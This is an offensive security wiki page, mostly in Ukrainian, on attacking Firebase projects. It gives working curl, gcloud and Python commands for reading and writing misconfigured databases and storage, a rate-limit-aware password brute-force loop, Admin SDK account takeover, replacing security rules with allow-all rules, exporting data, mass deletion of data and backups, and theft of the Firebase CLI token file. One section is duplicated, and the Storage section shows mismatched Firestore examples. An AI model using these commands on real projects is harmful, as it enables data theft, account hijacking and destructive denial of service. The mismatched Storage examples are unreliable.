# GCP - Firebase Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Firebase

### Unauthenticated access to Firebase Realtime Database
Зловмиснику не потрібні які-небудь спеціальні дозволи Firebase для виконання цієї атаки. Потрібна лише вразлива конфігурація в правилах безпеки Firebase Realtime Database, де правила встановлені як `.read: true` або `.write: true`, що дозволяє публічний доступ для читання або запису.

Зловмисник повинен визначити URL бази даних, який зазвичай має формат: `https://<project-id>.firebaseio.com/`.

Цей URL можна знайти через mobile application reverse engineering (decompiling Android APKs або analyzing iOS apps), аналіз конфігураційних файлів, таких як google-services.json (Android) або GoogleService-Info.plist (iOS), інспектування вихідного коду web applications або аналіз network traffic для виявлення запитів до доменів `*.firebaseio.com`.

Зловмисник визначає URL бази даних і перевіряє, чи він відкритий публічно, потім отримує доступ до даних і за потреби записує шкідливу інформацію.

Спочатку вони перевіряють, чи дозволяє база даних доступ для читання, додавши .json до URL.
```bash
curl https://<project-id>-default-rtdb.firebaseio.com/.json
```
Якщо відповідь містить JSON-дані або null (замість "Permission Denied"), база даних дозволяє доступ на читання. Щоб перевірити доступ на запис, атакуючий може спробувати надіслати тестовий запит на запис, використовуючи Firebase REST API.
```bash
curl -X PUT https://<project-id>-default-rtdb.firebaseio.com/test.json -d '{"test": "data"}'
```
Якщо операція вдасться, база даних також дозволяє доступ на запис.


### Розкриття даних у Cloud Firestore
Зловмиснику не потрібні специфічні права Firebase, щоб виконати цю атаку. Достатньо, щоб у правилах безпеки Cloud Firestore була вразлива конфігурація, в якій правила дозволяють доступ на читання або запис без автентифікації або з недостатньою валідацією. Приклад неправильно налаштованого правила, яке надає повний доступ, наведено нижче:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Це правило дозволяє будь-кому читати й записувати всі документи без будь-яких обмежень. Правила Firestore є гранулярними й застосовуються на рівні кожної колекції та документа, тому помилка в конкретному правилі може розкрити лише певні колекції.

Зловмиснику потрібно визначити Firebase Project ID, який можна знайти через mobile app reverse engineering, аналіз конфігураційних файлів, таких як google-services.json або GoogleService-Info.plist, перегляд коду web-застосунків або аналіз мережевого трафіку для виявлення запитів до firestore.googleapis.com.
The Firestore REST API uses the format:
```bash
https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
Якщо правила дозволяють неаутентифікований доступ для читання, атакуючий може читати collections та documents. Спочатку вони намагаються отримати доступ до конкретної collection:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>
```
Якщо відповідь містить JSON-документи замість помилки доступу, колекція є відкритою. Атакуючий може перерахувати всі доступні колекції, підбираючи поширені назви або аналізуючи структуру застосунку. Щоб отримати доступ до конкретного документа:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
Якщо правила дозволяють unauthenticated write access або мають insufficient validation, attacker може створити нові документи:
```bash
curl -X POST https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"name": {"stringValue": "Test"},
"email": {"stringValue": "test@example.com"}
}
}'
```
Щоб змінити існуючий документ, слід використовувати PATCH:
```bash
curl -X PATCH https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/users/<user-id> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"role": {"stringValue": "admin"}
}
}'
```
Щоб видалити документ і спричинити denial of service:
```bash
curl -X DELETE https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
### Розкриття файлів у Firebase Storage
Атакуючий не потребує жодних спеціальних дозволів Firebase для виконання цієї атаки. Для цього достатньо наявності вразливої конфігурації в security rules Firebase Storage, де правила дозволяють read або write доступ без authentication або з недостатньою валідацією. Storage rules контролюють read і write permissions незалежно, тож помилка в правилі може відкрити лише read access, лише write access або обидва. Приклад некоректно налаштованого правила, яке надає повний доступ, виглядає так:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Це правило дозволяє доступ на читання та запис до всіх документів без жодних обмежень. Firestore rules є детальними й застосовуються для кожної колекції та кожного документа, тому помилка в конкретному правилі може відкривати доступ лише до певних колекцій. Зловмисник повинен ідентифікувати Firebase Project ID, який можна знайти за допомогою mobile application reverse engineering, аналізу конфігураційних файлів, таких як google-services.json або GoogleService-Info.plist, перевірки вихідного коду веб-застосунку або аналізу мережевого трафіку для виявлення запитів до firestore.googleapis.com.

The Firestore REST API uses the format:`https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>.`

Якщо правила дозволяють неаутентифікований доступ для читання, зловмисник може читати колекції та документи. Спочатку він намагається отримати доступ до конкретної колекції.
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o"
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?prefix=<path>"
```
Якщо відповідь містить список файлів замість помилки доступу, файл відкритий. Атакуючий може переглянути вміст файлів, вказавши їхній шлях:
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<urlencode(path)>"
```
Якщо правила дозволяють запис без автентифікації або передбачають недостатню валідацію, зловмисник може завантажити шкідливі файли. Щоб завантажити файл через REST API:
```bash
curl -X POST "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?name=<path>" \
-H "Content-Type: <content-type>" \
--data-binary @<local-file>
```
Зловмисник може завантажувати code shells, malware payloads або великі файли, щоб викликати denial of service. Якщо додаток обробляє або виконує завантажені файли, зловмисник може досягти remote code execution. Щоб видалити файли та спричинити denial of service:
```bash
curl -X DELETE "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<path>"
```
### Виклик публічних Firebase Cloud Functions
An attacker не потребує жодних спеціальних дозволів Firebase, щоб експлуатувати цю проблему; достатньо, щоб Cloud Function була публічно доступна через HTTP без автентифікації.

Функція вразлива, коли вона неправильно налаштована:

- Використовує functions.https.onRequest, який не примушує автентифікацію (на відміну від onCall functions).
- Код функції не перевіряє автентифікацію користувача (наприклад, немає перевірок request.auth або context.auth).
- Функція публічно доступна в IAM, тобто allUsers має роль roles/cloudfunctions.invoker. Це поведінка за замовчуванням для HTTP functions, якщо розробник не обмежив доступ.

Firebase HTTP Cloud Functions доступні за URL-адресами, такими як:

- https://<region>-<project-id>.cloudfunctions.net/<function-name>
- https://<project-id>.web.app/<function-name> (when integrated with Firebase Hosting)

An attacker може знайти ці URL-адреси через source code analysis, network traffic inspection, enumeration tools або mobile app reverse engineering.
Якщо функція публічно відкрита і без автентифікації, attacker може викликати її напряму без credentials.
```bash
# Invoke public HTTP function with GET
curl "https://<region>-<project-id>.cloudfunctions.net/<function-name>"
# Invoke public HTTP function with POST and data
curl -X POST "https://<region>-<project-id>.cloudfunctions.net/<function-name>" \
-H "Content-Type: application/json" \
-d '{"param1": "value1", "param2": "value2"}'
```
Якщо функція не перевіряє вхідні дані належним чином, атакуючий може спробувати інші атаки, такі як code injection або command injection.

### Brute-force attack against Firebase Authentication with a weak password policy
Атакуючому не потрібні якісь специфічні дозволи Firebase, щоб виконати цю атаку. Потрібно лише, щоб Firebase API Key був відкритий у мобільних або веб-додатках, і щоб політика паролів не була налаштована суворіше за значення за замовчуванням.

Атакуючому потрібно визначити Firebase API Key, який можна знайти через reverse engineering мобільного додатка, аналіз конфігураційних файлів, таких як google-services.json або GoogleService-Info.plist, перевірку коду веб-додатків (наприклад, у bootstrap.js) або аналіз мережевого трафіку.

Firebase Authentication’s REST API використовує endpoint:
`https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>`
для автентифікації за електронною поштою та паролем.

Якщо Email Enumeration Protection вимкнено, відповіді API з помилками можуть виявити, чи існує email у системі (EMAIL_NOT_FOUND vs. INVALID_PASSWORD), що дозволяє атакуючому перелічувати користувачів перед спробами підбору пароля. Коли цей захист увімкнено, API повертає однакове повідомлення про помилку як для неіснуючих email, так і для неправильних паролів, що заважає перелічуванню користувачів.

Варто зазначити, що Firebase Authentication застосовує rate limiting, який може блокувати запити при занадто великій кількості спроб автентифікації за короткий час. Через це атакуючому доведеться вводити затримки між спробами, щоб уникнути блокування через rate limiting.

Атакуючий знаходить API Key і виконує спроби автентифікації з кількома паролями для відомих облікових записів. Якщо Email Enumeration Protection вимкнено, атакуючий може перелічувати наявних користувачів, аналізуючи відповіді з помилками:
```bash
# Attempt authentication with a known email and an incorrect password
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d '{
"email": "usuario@example.com",
"password": "password",
"returnSecureToken": true
}'
```
Якщо відповідь містить EMAIL_NOT_FOUND, електронна адреса не існує в системі. Якщо вона містить INVALID_PASSWORD, електронна адреса існує, але пароль неправильний, що підтверджує реєстрацію користувача. Після виявлення дійсного користувача зловмисник може виконувати brute-force спроби. Важливо додавати паузи між спробами, щоб уникнути механізмів обмеження швидкості Firebase Authentication:
```bash
counter=1
for password in $(cat wordlist.txt); do
echo "Intento $counter: probando contraseña '$password'"
response=$(curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d "{\"email\":\"usuario@example.com\",\"password\":\"$password\",\"returnSecureToken\":true}")

if echo "$response" | grep -q "idToken"; then
echo "Contraseña encontrada: $password (intento $counter)"
break
fi

# Stop for the rate limiting
sleep 1
counter=$((counter + 1))
done
```
За стандартної політики паролів (мінімум 6 символів, без вимог до складності) атакуючий може перебрати всі можливі комбінації 6-символьних паролів, що становить досить невеликий простір пошуку порівняно зі суворішими політиками паролів.

### Керування користувачами у Firebase Authentication

Атакуючому потрібні певні дозволи Firebase Authentication, щоб виконати цю атаку. Потрібні дозволи:

- `firebaseauth.users.create` для створення користувачів
- `firebaseauth.users.update` для змінення існуючих користувачів
- `firebaseauth.users.delete` для видалення користувачів
- `firebaseauth.users.get` для отримання інформації про користувачів
- `firebaseauth.users.sendEmail` для надсилання електронних листів користувачам
- `firebaseauth.users.createSession` для створення сесій користувачів

Ці дозволи входять до ролі `roles/firebaseauth.admin`, яка надає повний доступ на читання/запис до ресурсів Firebase Authentication. Вони також входять до ролей вищого рівня, таких як `roles/firebase.developAdmin` (включає всі дозволи `firebaseauth.*`) та `roles/firebase.admin` (повний доступ до всіх сервісів Firebase).

Щоб використовувати Firebase Admin SDK, атакуючому потрібен доступ до облікових даних сервісного облікового запису (JSON файл), які можуть бути знайдені на скомпрометованих системах, в публічно відкритих репозиторіях коду, у скомпрометованих CI/CD системах або внаслідок компрометації облікових записів розробників, що мають доступ до цих облікових даних.

Перший крок — налаштувати Firebase Admin SDK, використовуючи облікові дані сервісного облікового запису.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Щоб створити зловмисного користувача, використовуючи електронну пошту жертви, зловмисник намагатиметься використати Firebase Admin SDK для створення нового облікового запису з цією електронною поштою.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Щоб змінити існуючого користувача, зловмисник оновив би такі поля, як електронну адресу, статус підтвердження або стан деактивації облікового запису.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Щоб видалити обліковий запис користувача й спричинити denial of service, attacker направив би запит на повне видалення користувача.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
Attacker також може отримати інформацію про існуючих користувачів, запитавши їх UID або email address.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
Крім того, зловмисник може згенерувати verification links або password-reset links, щоб змінити пароль користувача та отримати доступ до їхнього облікового запису.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Керування користувачами у Firebase Authentication
Атакувальнику потрібні певні дозволи Firebase Authentication, щоб виконати цю атаку. Необхідні дозволи:

- `firebaseauth.users.create` to create users
- `firebaseauth.users.update` to modify existing users
- `firebaseauth.users.delete` to delete users
- `firebaseauth.users.get` to obtain user information
- `firebaseauth.users.sendEmail` to send emails to users
- `firebaseauth.users.createSession` to create user sessions

Ці дозволи включені в роль roles/firebaseauth.admin, яка надає повний доступ для читання/запису до ресурсів Firebase Authentication. Вони також входять до більш високорівневих ролей, таких як `roles/firebase.developAdmin` (що включає всі firebaseauth.* дозволи) та `roles/firebase.admin` (повний доступ до всіх сервісів Firebase).

Щоб використовувати Firebase Admin SDK, атакувальнику потрібен доступ до облікових даних сервісного облікового запису (JSON-файлу), які можуть бути отримані зкомпрометованих систем, публічно доступних репозиторіїв коду, скомпрометованих CI/CD-середовищ або шляхом компрометації облікових записів розробників, які мають доступ до цих облікових даних.

Перший крок — налаштувати Firebase Admin SDK, використовуючи облікові дані сервісного облікового запису.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Щоб створити зловмисного користувача, використовуючи електронну пошту жертви, зловмисник спробував би створити новий обліковий запис із тією електронною адресою, призначивши свій пароль і дані профілю.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Щоб змінити існуючого користувача, зловмисник змінює такі поля, як адреса електронної пошти, статус підтвердження або чи відключений обліковий запис.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Щоб видалити обліковий запис користувача — фактично спричиняючи відмову в обслуговуванні — зловмисник надіслав би запит на остаточне видалення цього користувача.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
Зловмисник також може отримати інформацію про існуючих користувачів, наприклад їх UID або email, запитавши деталі користувача за UID або за email-адресою.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
Крім того, зловмисник міг би згенерувати посилання для підтвердження або для скидання пароля, що дозволило б йому змінити пароль користувача та отримати контроль над обліковим записом.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Зміна правил безпеки у сервісах Firebase
Зловмиснику потрібні конкретні дозволи для зміни правил безпеки залежно від сервісу. Для Cloud Firestore та Firebase Cloud Storage потрібні дозволи `firebaserules.rulesets.create` для створення rulesets та `firebaserules.releases.create` для розгортання релізів. Ці дозволи входять до ролі `roles/firebaserules.admin` або до ролей вищого рівня, таких як `roles/firebase.developAdmin` та `roles/firebase.admin`. Для Firebase Realtime Database потрібен дозвіл `firebasedatabase.instances.update`.

Зловмисник має використовувати Firebase REST API для зміни правил безпеки.
Спочатку зловмиснику потрібно отримати токен доступу, використовуючи облікові дані service account.
Щоб отримати токен:
```bash
gcloud auth activate-service-account --key-file=path/to/serviceAccountKey.json
ACCESS_TOKEN=$(gcloud auth print-access-token)
```
Щоб змінити правила Firebase Realtime Database:
```bash
curl -X PUT "https://<project-id>-default-rtdb.firebaseio.com/.settings/rules.json?access_token=$ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"rules": {
".read": true,
".write": true
}
}'
```
Щоб змінити правила Cloud Firestore, атакувальник має створити ruleset, а потім розгорнути його:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "firestore.rules",
"content": "rules_version = '\''2'\'';\nservice cloud.firestore {\n  match /databases/{database}/documents {\n    match /{document=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
Попередня команда повертає назву ruleset у форматі projects/<project-id>/rulesets/<ruleset-id>. Щоб розгорнути нову версію, реліз потрібно оновити за допомогою PATCH-запиту:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/cloud.firestore" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/cloud.firestore",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
Щоб змінити правила Firebase Cloud Storage:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "storage.rules",
"content": "service firebase.storage {\n  match /b/{bucket}/o {\n    match /{allPaths=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
Попередня команда повертає ім'я ruleset у форматі projects/<project-id>/rulesets/<ruleset-id>. Щоб розгорнути нову версію, потрібно оновити реліз за допомогою PATCH-запиту:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/firebase.storage/<bucket-id>" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/firebase.storage/<bucket-id>",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
### Екзфільтрація та маніпуляція даними в Cloud Firestore
Cloud Firestore використовує ту ж інфраструктуру та систему дозволів, що й Cloud Datastore, тому Datastore IAM permissions застосовуються безпосередньо до Firestore. Щоб змінювати TTL-політики, потрібен дозвіл `datastore.indexes.update`. Щоб експортувати дані, потрібен дозвіл `datastore.databases.export`. Щоб імпортувати дані, потрібен дозвіл datastore.databases.import. Для виконання масового видалення даних потрібен дозвіл `datastore.databases.bulkDelete`.

Для операцій резервного копіювання та відновлення потрібні конкретні дозволи:

- `datastore.backups.get` and `datastore.backups.list` — для переліку та отримання деталей доступних резервних копій
- `datastore.backups.delete` — для видалення резервних копій
- `datastore.backups.restoreDatabase` — для відновлення бази даних з резервної копії
- `datastore.backupSchedules.create` and `datastore.backupSchedules.delete` — для керування розкладом резервного копіювання

Коли створюється TTL-політика, обирається певна властивість, яка визначає сутності, що підлягають видаленню. Ця TTL-властивість має бути типу Date and time. Зловмисник може вибрати властивість, яка вже існує, або вказати властивість, яку планує додати пізніше. Якщо значення поля містить дату в минулому, документ стає придатним для негайного видалення. Зловмисник може використовувати gcloud CLI для маніпулювання TTL-політиками.
```bash
# Enable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--enable-ttl
# Disable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--disable-ttl
```
Щоб експортувати дані та exfiltrate їх, зловмисник може скористатися gcloud CLI.
```bash
gcloud firestore export gs://<bucket-name> --project=<project-id> --async --database='(default)'
```
Щоб імпортувати шкідливі дані:
```bash
gcloud firestore import gs://<bucket-name>/<path> --project=<project-id> --async --database='(default)'
```
Щоб здійснити масове видалення даних і спричинити denial of service, зловмисник може використати gcloud Firestore bulk-delete tool, щоб видалити цілі колекції.
```bash
gcloud firestore bulk-delete \
--collection-ids=users,posts,messages \
--database='(default)' \
--project=<project-id>
```
Для операцій резервного копіювання та відновлення зловмисник може створювати заплановані резервні копії, щоб зафіксувати поточний стан бази даних, перераховувати наявні резервні копії, відновлювати з резервної копії для перезапису нещодавніх змін, видаляти резервні копії, щоб спричинити безповоротну втрату даних, і видаляти заплановані резервні копії.
Щоб створити щоденний графік резервного копіювання, який одразу генерує резервну копію:
```bash
gcloud firestore backups schedules create \
--database='(default)' \
--recurrence=daily \
--retention=14w \
--project=<project-id>
```
Щоб відновити з конкретної резервної копії, атакуючий може створити нову базу даних, використавши дані, що містяться в цій резервній копії. Операція відновлення записує дані резервної копії у нову базу даних, що означає, що існуючий DATABASE_ID не може бути використаний.
```bash
gcloud firestore databases restore \
--source-backup=projects/<project-id>/locations/<location>/backups/<backup-id> \
--destination-database='<new-database-id>' \
--project=<project-id>
```
Щоб видалити резервну копію та спричинити незворотну втрату даних:
```bash
gcloud firestore backups delete \
--backup=<backup-id> \
--project=<project-id>
```
### Крадіжка та зловживання обліковими даними Firebase CLI

Зловмиснику не потрібні спеціальні дозволи Firebase, щоб виконати цю атаку, але йому потрібен доступ до локальної системи розробника або до файлу облікових даних Firebase CLI. Ці облікові дані зберігаються у JSON-файлі за адресою:

- Linux/macOS: ~/.config/configstore/firebase-tools.json

- Windows: C:\Users\[User]\.config\configstore\firebase-tools.json

У цьому файлі містяться токени автентифікації, зокрема refresh_token і access_token, які дозволяють зловмиснику автентифікуватися як користувач, що спочатку виконав firebase login.

Здобувши доступ до файлу облікових даних Firebase CLI, зловмисник може скопіювати весь файл на свою систему — Firebase CLI автоматично використає облікові дані зі свого стандартного розташування. Після цього зловмисник зможе переглянути всі Firebase проєкти, доступні цьому користувачу.
```bash
firebase projects:list
```
{{#include ../../../banners/hacktricks-training.md}}
